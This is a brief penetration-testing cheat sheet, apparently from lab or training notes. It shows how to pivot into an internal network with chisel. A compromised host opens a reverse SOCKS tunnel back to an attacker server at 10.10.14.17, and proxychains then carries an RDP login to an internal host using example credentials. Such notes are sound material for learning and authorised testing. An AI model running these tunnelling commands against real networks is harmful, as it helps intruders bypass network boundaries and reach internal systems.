# Chisel Reverse Example

OS: Linux
Description: Reverse Pivot with Chisel
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Chisel Reverse

- On attack host

```jsx
sudo ./chisel server --reverse -v -p 1234 --socks5
```

- On the pivot box

```jsx
./chisel client -v 10.10.14.17:1234 R:socks
```

- Proxychains through pivot

```jsx
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```